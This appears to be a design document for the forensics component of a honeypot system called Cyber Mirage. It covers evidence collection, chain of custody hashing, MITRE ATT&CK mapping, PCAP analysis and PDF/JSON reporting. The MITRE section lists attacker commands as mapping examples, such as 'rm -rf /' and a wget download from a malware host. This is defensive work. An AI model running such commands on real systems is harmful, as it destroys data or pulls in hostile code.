# Role 6: Digital Forensics Engineer (مهندس الأدلة الجنائية الرقمية)

## 🕵️ Overview
**Role 6** acts as the automated "Digital Detective" of the Cyber Mirage system. While other roles focus on deception (Role 1) or decision making (Role 2), Role 6 is responsible for the **post-mortem analysis** and **legal defensibility** of the data. Its primary goal is to transform raw attack data into court-admissible forensic evidence.

This role ensures that every action taken by an attacker is not just observed, but rigorously documented, hashed, and analyzed to produce actionable intelligence and legal proof.

---

## 🏗️ Architecture & Component Interaction

The Forensics module is a collection of specialized sub-systems that work in harmony.


---

## 🧩 Component Deep Dive

### 1. 🧹 Evidence Collector (`evidence_collector.py`)
**"The Crime Scene Investigator"**
This is the central orchestrator. It sweeps through the entire infrastructure to gather digital artifacts.
*   **Functionality**:
    *   **Container Forensics**: Executes `docker logs` to capture `stdout/stderr` from honeypots, capturing commands typed by attackers (e.g., `wget`, `rm -rf`).
    *   **Database Snapshots**: Exports relevant rows from PostgreSQL (`attack_sessions`) to freeze the state of the attack record.
    *   **Memory Forensics**: Dumps active keys from Redis to capture ephemeral data like current session state and reputation scores.
    *   **Hashing**: Immediately calculates `MD5`, `SHA256`, and `SHA512` hashes for every collected file to establish a baseline for integrity.

### 2. ⛓️ Chain of Custody (`chain_of_custody.py`)
**"The Legal Notary"**
Ensures the evidence is admissible in court by tracking every interaction.
*   **Key Concept**: **Immutable Audit Trail**.
*   **Workflow**:
    1.  **Registration**: When evidence is collected, it gets a unique ID and initial Hash.
    2.  **Tracking**: Any transfer, analysis, or viewing of the evidence is recorded as a `CustodyEntry`.
    3.  **Verification**: The system can run a `verify_integrity()` check at any time to compare the current file hash against the original. If they differ by even one bit, the evidence is marked as **COMPROMISED**.

```mermaid
sequenceDiagram
    participant Sys as System
    participant Ev as Evidence Item
    participant CoC as Chain of Custody
    participant Rep as Report
    
    Sys->>Ev: Collect Artifact (Log/DB)
    Sys->>CoC: Register Evidence (Calculate Hash)
    CoC-->>Ev: Assign Evidence ID
    
    Note over Ev, CoC: Evidence is now "Sealed"
    
    Sys->>Ev: Analyze (Read File)
    Sys->>CoC: Log Action "ANALYZED"
    
    Sys->>Ev: Generate Report
    Sys->>CoC: Verify Integrity (Re-Hash)
    
    alt Hash Matches
        CoC-->>Rep: Integrity Verified ✅
    else Hash Mismatch
        CoC-->>Rep: ALERT: TAMPERING DETECTED ❌
    end
```



### 3. 🗺️ MITRE ATT&CK Mapper (`mitre_attack_mapper.py`)
**"The Profiler"**
Translates technical actions into standardized threat intelligence.
*   **Logic**: It parses command logs and patterns to map them to specific **TTPs** (Tactics, Techniques, and Procedures).
*   **Examples**:
    *   `User: anonymous` -> **T1190** (Exploit Public-Facing Application).
    *   `rm -rf /` -> **T1485** (Data Destruction).
    *   `wget http://malware.com` -> **T1105** (Ingress Tool Transfer).

### 4. 📡 PCAP Analyzer (`pcap_analyzer.py`)
**"The Network Analyst"**
Digs into the raw network traffic.
*   **Capabilities**:
    *   **Protocol Hierarchy**: Break down traffic by protocol (TCP, UDP, HTTP, SSH).
    *   **Session Reconstruction**: Rebuilds the conversation between attacker and honeypot.
    *   **Anomaly Detection**: Identifies port scans (SYN floods) and brute force attempts based on packet frequency and flags.

### 5. ⏱️ Timeline Builder (`timeline_builder.py`)
**"The Historian"**
Reconstructs the "Story" of the attack.
*   **Fusion**: Merges data from disparate sources (DB, Logs, Network) into a single chronological stream.
*   **Normalization**: Converts all timestamps to a standard ISO format to ensure accurate sequencing.
*   **Context**: Enriches events with severity levels (e.g., `CRITICAL` for file deletion, `INFO` for connection).

### 6. 📄 Report Generator (`report_generator.py`)
**"The Stenographer"**
Compiles everything into a professional, readable format.
*   **Outputs**:
    *   **PDF**: For human executives and legal teams. Includes executive summaries, charts, and legal notices.
    *   **JSON**: For machine ingestion (SIEM systems, other analysis tools).
*   **Standards**: Follows **NIST SP 800-86** guidelines for forensic reporting.

---

## 🔄 Integration with Other Roles

### 🤝 With Role 5 (Containment Specialist)
*   **Trigger**: When Role 5 decides to "Kill" a container due to high risk.
*   **Action**: Role 6 is triggered *immediately before* the kill command to perform a **"Deathbed Dump"**—collecting all volatile memory and logs before they are lost forever.

### 🤝 With Role 7 (Dashboard & Visualization)
*   **Data Feed**: Role 6 provides the structured JSON data that populates the "Forensics" tab in the dashboard.
*   **Download**: The Dashboard offers a "Download Report" button, which triggers the `ReportGenerator` to build a fresh PDF on demand.

---

## 💡 Why This Matters? (The "So What?")

1.  **Legal Admissibility**: Without Chain of Custody, your logs are just text files. With it, they are **evidence**.
2.  **Attribution**: By mapping to MITRE, we move from "someone hacked us" to "APT29 used T1190 to gain access".
3.  **Resilience**: Even if the attacker deletes their tracks on the honeypot, the **Evidence Collector** has likely already streamed and hashed the logs to a secure location.

---

## 🖥️ Code Highlight: The Integrity Check

The core of the forensic reliability lies in this snippet from `chain_of_custody.py`:

```python
def verify_integrity(self, evidence_id: str) -> Dict[str, Any]:
    # 1. Get the evidence record
    evidence = self.evidence_items[evidence_id]
    
    # 2. Calculate current hash of the file on disk
    actual_hash = self._calculate_hash(evidence.file_path)
    
    # 3. Compare with the Original Hash (from moment of collection)
    if actual_hash == evidence.original_hash:
        return {"status": "INTACT", "valid": True}
    else:
        # 4. ALARM! File has been tampered with
        return {"status": "COMPROMISED", "valid": False}
```
